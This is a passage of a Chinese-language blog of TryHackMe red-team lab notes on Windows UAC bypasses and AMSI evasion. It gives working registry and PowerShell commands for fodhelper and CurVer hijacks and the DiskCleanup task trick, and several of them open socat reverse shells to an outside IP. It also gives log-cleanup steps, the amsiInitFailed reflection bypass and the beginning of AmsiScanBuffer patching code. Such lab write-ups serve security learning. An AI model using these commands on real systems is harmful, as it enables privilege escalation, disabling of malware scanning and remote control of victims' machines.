<span class="line"><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">add</span><span style="color: #ABB2BF"> %REG_KEY% /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> %CMD% /</span><span style="color: #E06C75">f</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 查看被删除的注册表</span></span>
<span class="line"><span style="color: #ABB2BF">reg query %REG_KEY% /</span><span style="color: #E06C75">v</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span></span></code></pre></div></div></figure>
<p>不过这里可以发现 WD 删除注册表是要时间的，如果我们在写入注册表之后马上执行，那么一样能拿到 shell。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">add</span><span style="color: #ABB2BF"> %REG_KEY% /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> %CMD% /</span><span style="color: #E06C75">f</span><span style="color: #ABB2BF"> &amp; fodhelper.exe</span></span></code></pre></div></div></figure>
<h4 id="利用-CurVer-劫持-UAC">利用 CurVer 劫持 UAC</h4>
<p><a target="_blank" rel="noopener" href="https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses">@V3ded</a> 提出了一种对 fodhelper 漏洞利用的变种，使用了不同的注册表键，但基本原理相同。</p>
<p>这个复杂的 UAC 绕过技术不再直接修改 <code>ms-settings</code> 的命令键，而是利用了一个更为隐蔽的机制：<strong><code>ProgID</code> 的 <code>CurVer</code> 条目</strong>。</p>
<p><strong>攻击原理：利用版本重定向</strong></p>
<p><code>CurVer</code>（Current Version，当前版本）是 Windows 设计用来在系统中管理同一应用的多个不同版本时使用的。它允许一个 <code>ProgID</code> 指向应用的最新或默认版本。当 Windows 需要打开一个文件或执行某个协议时，它会首先检查 <code>CurVer</code> 条目，然后根据该条目的指引去寻找实际的执行命令。</p>
<p>攻击者正是利用了这个重定向功能来<strong>欺骗 <code>fodhelper.exe</code></strong>。</p>
<p><strong>攻击步骤</strong></p>
<ol>
<li><strong>设置陷阱</strong>：攻击者首先在注册表中创建一个<strong>全新的 <code>ProgID</code></strong>（可以随意命名）。这个新的 <code>ProgID</code> 包含了攻击者的恶意命令。</li>
<li><strong>制造重定向</strong>：然后，攻击者将合法的 <code>ms-settings</code> <code>ProgID</code> 的 <code>CurVer</code> 条目<strong>修改</strong>为指向这个新创建的 <code>ProgID</code>。</li>
<li><strong>触发执行</strong>：当 <code>fodhelper.exe</code> 运行时，它会像往常一样，通过 <code>ms-settings</code> <code>ProgID</code> 来寻找要执行的命令。但这次，它会首先遇到 <code>CurVer</code> 条目，并被<strong>重定向</strong>到我们伪造的 <code>ProgID</code>。</li>
<li><strong>执行恶意代码</strong>：最终，<code>fodhelper.exe</code> 会检查我们这个新 <code>ProgID</code> 的配置，并<strong>在完全没有 UAC 提示的情况下，执行我们预先设置好的恶意命令</strong>。</li>
</ol>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$program</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:10.6.4.118:4445 EXEC:cmd.exe,pipes&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #56B6C2">New-Item</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;HKCU:\Software\Classes\.pwn\Shell\Open\command&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Force</span></span>
<span class="line"><span style="color: #56B6C2">Set-ItemProperty</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;HKCU:\Software\Classes\.pwn\Shell\Open\command&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&quot;(default)&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Value </span><span style="color: #E06C75">$program</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Force</span></span>
<span class="line"><span style="color: #ABB2BF">    </span></span>
<span class="line"><span style="color: #56B6C2">New-Item</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Path </span><span style="color: #98C379">&quot;HKCU:\Software\Classes\ms-settings\CurVer&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Force</span></span>
<span class="line"><span style="color: #56B6C2">Set-ItemProperty</span><span style="color: #ABB2BF">  </span><span style="color: #98C379">&quot;HKCU:\Software\Classes\ms-settings\CurVer&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&quot;(default)&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">value </span><span style="color: #98C379">&quot;.pwn&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Force</span></span>
<span class="line"><span style="color: #56B6C2">Start-Process</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;C:\Windows\System32\fodhelper.exe&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">WindowStyle </span><span style="color: #C678DD">Hidden</span></span></code></pre></div></div></figure>
<p>用 PowerShell 执行会报毒，但是 cmd 不会，因为杀毒软件采用的检测方法是严格针对已公开的利用方式实现的。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">set </span><span style="color: #E06C75">CMD</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.6.4.118:4445 EXEC:cmd.exe,pipes&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">add</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;HKCU\Software\Classes\.thm\Shell\Open\command&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> %CMD% /</span><span style="color: #E06C75">f</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">add</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;HKCU\Software\Classes\ms-settings\CurVer&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;.thm&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">f</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">fodhelper.exe</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 清理痕迹</span></span>
<span class="line"><span style="color: #ABB2BF">reg delete </span><span style="color: #98C379">&quot;HKCU\Software\Classes\.thm\&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">f</span></span>
<span class="line"><span style="color: #ABB2BF">reg delete </span><span style="color: #98C379">&quot;HKCU\Software\Classes\ms-settings\&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">f</span></span></code></pre></div></div></figure>
<h2 id="绕过最高级的-UAC">绕过最高级的 UAC</h2>
<p>在默认的 Windows 配置下，你可以滥用与系统配置相关的应用程序来绕过 UAC，因为这些应用的大多数在其清单中设置了 autoElevate 标志。然而，如果 UAC 被配置为“始终通知”级别，它们在提升权限时会要求用户通过 UAC 提示，无法绕过。</p>
<p>但是并不是没有办法，可以使用计划任务绕过这点限制，任何需要提升权限的计划任务都会自动获得提升。</p>
<h3 id="案例研究：磁盘清理计划任务">案例研究：磁盘清理计划任务</h3>
<p>在这里我们可以看到该任务被配置为以“Users”帐户运行，这意味着它会继承调用者的权限。“以最高权限运行”选项将使用调用者可用的最高权限安全令牌，对于管理员而言这是一个高完整性级别（IL）的令牌。请注意，如果普通非管理员用户调用此任务，它将只以中等完整性级别（medium IL）执行，因为那是非管理员可用的最高权限令牌，因此绕过将无法生效。</p>
<img src="/thm_rthe/image-20250827234532455.png" class="" title="image-20250827234532455">
<p>查看“操作”和“设置”选项卡，我们得到以下内容：</p>
<img src="/thm_rthe/3b8dd4c6a441eb19620bc3bedd536a8b.png" class="" title="img">
<p>该任务可以按需运行，在调用时执行以下命令：</p>
<p><code>%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%</code></p>
<p>由于该命令依赖于环境变量，我们可以注入命令到这些变量中，并通过手动启动磁盘清理任务使其被执行。</p>
<p>我们可以通过在注册表中创建一个条目来覆盖 <code>%windir%</code> 变量，路径为 <code>HKCU\Environment</code> 。如果我们想使用 socat 执行反向 shell，可以将 <code>%windir%</code> 设置为如下（不含引号）：</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">cmd.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">c</span><span style="color: #ABB2BF"> C:\</span><span style="color: #E06C75">tools</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">socat</span><span style="color: #ABB2BF">\socat.exe TCP:</span><span style="color: #D19A66">10.6.4.118</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">4445</span><span style="color: #ABB2BF"> EXEC:cmd.exe,</span><span style="color: #E06C75">pipes</span><span style="color: #ABB2BF"> &amp;</span><span style="color: #E06C75">REM</span></span></code></pre></div></div></figure>
<p>在我们的命令末尾，我们拼接 &quot;&amp;REM &quot;（以空格结尾），以便在展开环境变量时注释掉放在 <code>%windir%</code> 之后的任何内容，从而得到 DiskCleanup 使用的最终命令。最终拼接后生成的命令如下：</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">cmd.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">c</span><span style="color: #ABB2BF"> C:\</span><span style="color: #E06C75">tools</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">socat</span><span style="color: #ABB2BF">\socat.exe TCP:</span><span style="color: #D19A66">10.6.4.118</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">4445</span><span style="color: #ABB2BF"> EXEC:cmd.exe,</span><span style="color: #E06C75">pipes</span><span style="color: #ABB2BF"> &amp;</span><span style="color: #E06C75">REM</span><span style="color: #ABB2BF"> \</span><span style="color: #E06C75">system32</span><span style="color: #ABB2BF">\cleanmgr.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">autoclean</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> %systemdrive%</span></span></code></pre></div></div></figure>
<p>拿到 shell 之后执行修改注册表的环境变量</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">reg </span><span style="color: #56B6C2">add</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;HKCU\Environment&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">v</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;windir&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;cmd.exe /c C:\tools\socat\socat.exe TCP:10.6.4.118:4446 EXEC:cmd.exe,pipes &amp;REM &quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">f</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 执行计划任务</span></span>
<span class="line"><span style="color: #E06C75">schtasks</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">run</span><span style="color: #ABB2BF">  /</span><span style="color: #E06C75">tn</span><span style="color: #ABB2BF"> \</span><span style="color: #E06C75">Microsoft</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Windows</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">DiskCleanup</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">SilentCleanup</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">I</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># 删除痕迹</span></span>
<span class="line"><span style="color: #ABB2BF">reg delete </span><span style="color: #98C379">&quot;HKCU\Environment&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">v</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;windir&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">f</span></span></code></pre></div></div></figure>
<h2 id="自动绕过-UAC">自动绕过 UAC</h2>
<p>手动弄了那么多，现在有自动化的方法。<a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">UACME</a> 提供了多个工具可以供你测试绕过 UAC。</p>
<p>这个房间主要专注于名为 Akagi 的那个，使用该工具很简单，只需指出要测试的方法对应的编号即可。</p>
<p>如果你想测试方法 33，可以在命令提示符中执行以下操作，然后会弹出一个高完整性（high integrity）的 cmd.exe：</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">UACME-Akagi64.exe 33</span></span></code></pre></div></div></figure>
<p>本房间中介绍的方法也可以通过 UACME 使用以下方法进行测试：</p>
<table>
<thead>
<tr>
<th style="text-align:left">Method Id</th>
<th style="text-align:left">Bypass technique</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">33</td>
<td style="text-align:left">fodhelper.exe</td>
</tr>
<tr>
<td style="text-align:left">34</td>
<td style="text-align:left">DiskCleanup scheduled task</td>
</tr>
<tr>
<td style="text-align:left">70</td>
<td style="text-align:left">fodhelper.exe using CurVer registry key</td>
</tr>
</tbody>
</table>
<p>测试了挺多的，提供的靶机挺多都可以用，工具的文档也挺详细，就是要自己编译。</p>
<h2 id="更多资源">更多资源</h2>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">UACME github repository</a></li>
<li><a target="_blank" rel="noopener" href="https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/">Bypassing UAC with mock folders and DLL hijacking</a></li>
<li><a target="_blank" rel="noopener" href="https://elastic.github.io/security-research/whitepapers/2022/02/03.exploring-windows-uac-bypass-techniques-detection-strategies/article/">UAC bypass techniques detection strategies</a></li>
<li><a target="_blank" rel="noopener" href="https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html">Reading your way around UAC</a></li>
</ul>
<h1>Runtime Detection Evasion</h1>
<p>这个房间主要是讲绕 AMSI 的，我觉得标题应该取成 Script or PowerShell Runtime Detection Evasion，因为这整个房间都是围绕 PowerShell 的。</p>
<h2 id="AMSI-概要">AMSI 概要</h2>
<p>Windows 反恶意软件扫描接口（AMSI）是一种通用的接口标准，允许应用程序和服务与计算机上的任何反恶意软件产品集成。</p>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/AMSI/antimalware-scan-interface-portal">文档</a></p>
<p>AMSI 会根据监控或者扫描得到的状态码确定他的行为，下面是可能的状态码：</p>
<ul>
<li>AMSI_RESULT_CLEAN = 0</li>
<li>AMSI_RESULT_NOT_DETECTED = 1</li>
<li>AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384</li>
<li>AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479</li>
<li>AMSI_RESULT_DETECTED = 32768</li>
</ul>
<p>这些状态码通过 AMSI 的后端或者第三方的实现才能看到。如果 AMSI 检测出一个威胁的结果，他会停止执行然后发送错误消息。</p>
<p><strong>下列 Windows 组件集成了 AMSI ：</strong></p>
<ul>
<li>User Account Control, or UAC</li>
<li>PowerShell</li>
<li>Windows Script Host (wscript and cscript)</li>
<li>JavaScript and VBScript</li>
<li>Office VBA macros</li>
</ul>
<h2 id="AMSI-插桩">AMSI 插桩</h2>
<p>AMSI 的插桩方式有点复杂，他包含了大量的 DLL ，根据插桩的地方不同，有不同的执行策略。根据定义，AMSI 只是其他反恶意软件产品的一个接口，AMSI 会根据正在执行的内容以及其执行的层级，使用多个提供程序 DLL 和 API 调用。</p>
<p><code>System.Management.Automation.dll</code>（即 PowerShell 的核心）被 AMSI 所插桩，这是一个由 Windows 开发的 .NET assembly；根据微软文档，“程序集构成了基于 .NET 的应用程序在部署、版本控制、重用、激活范围和安全权限方面的基本单元。”该 .NET assembly 会根据解释器以及代码是在磁盘上还是在内存中，对其他 DLL 和 API 调用进行插桩。下图描述了数据在各层流动时如何被分解以及哪些 DLL/API 调用被插装。</p>
<img src="/thm_rthe/35e16d45ce27145fcdf231fdb8dcb35e.png" class="" title="img">
<p>在上图中，数据将根据所使用的解释器（PowerShell/VBScript/等）进行处理。随着数据在模型各层向下传递，各种 API 调用和接口都会被插桩。理解 AMSI 的完整模型很重要，但我们可以将其拆解为核心组件，如下图所示。</p>
<img src="/thm_rthe/efca9438e858f0476a4ffd777c36501a.png" class="" title="img">
<p>注意：AMSI 只有在代码被通用语言运行时（CLR）在内存中执行时才开始扫描。因为代码如果在硬盘上，WD 就会扫描他，所以 AMSI 是在这个场景下才扫描的。理解成 WD 静态扫描，AMSI 动态扫描就行。</p>
<p>要查找 PowerShell 被 AMSI 插桩的位置，我们可以使用 Cobbr 维护的 <a target="_blank" rel="noopener" href="https://github.com/PowerShell/PowerShell/compare/master...cobbr:master">InsecurePowerShell</a>。InsecurePowerShell 是一个移除安全功能的 PowerShell 的 GitHub 分支，我们可以查看 commit 发现更改的地方。AMSI 仅在 <code>src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs</code> 下的十二行代码中被插桩。这十二行代码如下所示。</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">var scriptExtent </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">scriptBlockAst</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">Extent</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">AmsiUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">ScanContent</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">scriptExtent</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">Text</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">scriptExtent</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">File</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">AmsiUtils</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">AmsiNativeMethods</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">AMSI_RESULT</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">AMSI_RESULT_DETECTED</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #ABB2BF">  var parseError </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ParseError</span><span style="color: #ABB2BF">(scriptExtent, </span><span style="color: #98C379">&quot;ScriptContainedMaliciousContent&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">ParserStrings</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">ScriptContainedMaliciousContent</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">throw</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ParseException</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF">[] { parseError });</span></span>
<span class="line"><span style="color: #ABB2BF"> }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">ScriptBlock</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">CheckSuspiciousContent</span><span style="color: #ABB2BF">(scriptBlockAst) </span><span style="color: #C678DD">!=</span><span style="color: #ABB2BF"> null)</span></span>
<span class="line"><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #ABB2BF">  HasSuspiciousContent </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF"> }</span></span></code></pre></div></div></figure>
<h2 id="绕过-AMSI">绕过 AMSI</h2>
<h3 id="PowerShell-降级">PowerShell 降级</h3>
<p>PowerShell 降级攻击是一个唾手可得的手段，允许攻击者修改当前的 PowerShell 版本以移除安全功能。</p>
<p>大多数 PowerShell 会话会启动最近的 PowerShell 引擎，但是攻击者能通过一行命令去修改他的版本。PowerShell 的安全特性是在 5.0 版本才实现的，所以可以绕过这些安全特性。</p>
<figure class="shiki power"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre><code># 通过 -Version 指定版本
PowerShell -Version 2</code></pre></div></div></figure>
<p><a target="_blank" rel="noopener" href="https://github.com/trustedsec/unicorn">Unicorn</a> 是利用这种攻击的一个例子，因为这种攻击门槛很低，可以通过移除 PowerShell 2.0 引擎和其他的方法去解决他。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">full_attack = &#39;&#39;&#39;powershell /w 1 /C &quot;sv {0} -;</span></span>
<span class="line"><span style="color: #abb2bf">sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());</span></span>
<span class="line"><span style="color: #abb2bf">powershell (gv {5}).value.toString() (\\&#39;&#39;&#39;&#39;.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + &quot;)&quot; + &#39;&quot;&#39;</span></span></code></pre></div></div></figure>
<h3 id="PowerShell-反射">PowerShell 反射</h3>
<p>反射允许用户或者管理员直接访问 .Net 程序集和交互，PowerShell 反射可被滥用来修改并识别有价值 DLL 中的信息。</p>
<p>PowerShell 的 AMSI 存储在位于 <code>System.Management.Automation.AmsiUtils</code> 的 <code>AMSIUtils</code> .NET 程序集中。</p>
<p>Matt Graeber 用一行命令就可以通过反射来修改并绕过 AMSI 。下面的代码块展示了这一行命令。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;System.Management.Automation.AmsiUtils&#39;</span><span style="color: #ABB2BF">).GetField(</span><span style="color: #98C379">&#39;amsiInitFailed&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonPublic,Static&#39;</span><span style="color: #ABB2BF">).SetValue(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">$true</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 1.调用反射函数并指定它要使用来自 [Ref.Assembly] 的程序集，然后它将使用 GetType 获取类型</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;System.Management.Automation.AmsiUtils&#39;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 2.从上一节收集的信息将被转发到下一个函数，以使用 GetField 在程序集内获取指定字段</span></span>
<span class="line"><span style="color: #ABB2BF">.GetField(</span><span style="color: #98C379">&#39;amsiInitFailed&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonPublic,Static&#39;</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 3.然后程序集和字段信息将被转发到下一个参数，以使用 SetValue 将值从 $false 设置为 $true</span></span>
<span class="line"><span style="color: #ABB2BF">.SetValue(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">$true</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure>
<p>一旦 <code>amsiInitFailed</code> 字段被设置为 <code>$true</code> ，AMSI 将返回响应代码：AMSI_RESULT_NOT_DETECTED = 1</p>
<h3 id="修补-AMSI">修补 AMSI</h3>
<p>AMSI 会插桩到 <code>System.Management.Automation.dll</code>（即 PowerShell 的核心）这里去调用 <code>amsi.dll</code>；但是这个 <code>dll</code> 可以被操纵，让他强制指向我们想要的一个响应代码。这个 DLL 里面有一个叫 <code>AmsiScanBuffer</code> 的函数，它会扫描一段疑似代码的 “buffer”，并将其报告给 <code>amsi.dll</code> 拿到结果。假设我们可以控制此函数并用一个干净的返回代码覆盖该缓冲区，是不是就能绕过了？</p>
<p><code>AmsiScanBuffer</code> 脆弱的原因是因为 <code>amsi.dll</code> 是加载到 PowerShell 进程的，但是我们的会话具有与该程序相同的权限级别。</p>
<p>我们将分析 BC-Security 受 Tal Liberman 启发而修改的代码片段；你可以在<a target="_blank" rel="noopener" href="https://github.com/BC-SECURITY/Empire/blob/master/empire/server/common/bypasses.py">这里</a>找到原始代码。RastaMouse 也有一个用 C# 编写的类似旁路，使用了相同的技术；你可以在<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/AmsiScanBufferBypass">这里</a>找到代码。</p>
<p>从宏观上看，AMSI 修补可以分为四个步骤：</p>
<ol>
<li>获取 amsi.dll 的句柄</li>
<li>获取 AmsiScanBuffer 的进程地址</li>
<li>修改 AmsiScanBuffer 的内存保护</li>
<li>向 AmsiScanBuffer 写入操作码</li>
</ol>
<p>我们首先需要加载要使用的外部库和 API，通过 <a href="p/invoke">p/invoke</a> 从 kernel32 加载 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress">GetProcAddress</a>、<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea">GetModuleHandle</a> 和 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect</a>。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #ABB2BF">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #ABB2BF">)] </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 导入提供 API 的 DLL</span></span>
<span class="line"><span style="color: #ABB2BF">public </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> extern IntPtr GetProcAddress( </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> 要导入的 API</span></span>
<span class="line"><span style="color: #ABB2BF">	IntPtr hModule, </span><span style="color: #56B6C2">//</span><span style="color: #ABB2BF"> DLL 模块的句柄</span></span>
